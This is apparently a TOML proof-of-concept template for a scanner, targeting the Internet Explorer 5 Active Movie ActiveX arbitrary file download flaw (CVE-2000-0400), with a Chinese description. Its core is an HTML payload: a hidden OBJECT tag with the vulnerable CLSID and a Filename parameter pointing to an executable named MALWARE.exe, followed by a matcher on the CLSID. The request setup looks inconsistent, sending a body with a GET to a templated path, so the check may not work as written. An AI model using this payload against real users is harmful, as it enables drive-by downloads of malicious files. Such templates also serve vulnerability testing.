[info]
author = "ave"
description = 'Microsoft Active Movie ActiveX 控件（CLSID:05589FA1-C356-11CE-BF01-00AA0055595A）在 Internet Explorer 5 中未对可下载文件类型进行限制。通过构造包含该控件 OBJECT 标签的 HTML 页面并设置 Filename 参数，可远程下载任意文件到用户系统 C:\WINDOWS\TEMP 目录。'
id = "POC-AVE-2000-0330"
name = "Microsoft Active Movie ActiveX Control Arbitrary File Download PoC"
severity = "high"
tags = ["ave-2000-0330"]
vuln_id = [
    "CVE-2000-0400",
    "AVE-2000-0330",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = '''
<HTML>
<OBJECT classid=clsid:05589FA1-C356-11CE-BF01-00AA0055595A height=1 style="DISPLAY: none" width=1>
<PARAM NAME="Filename" VALUE="C:\WINDOWS\TEMP\MALWARE.exe">
</OBJECT>
</HTML>'''
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["05589FA1-C356-11CE-BF01-00AA0055595A"]
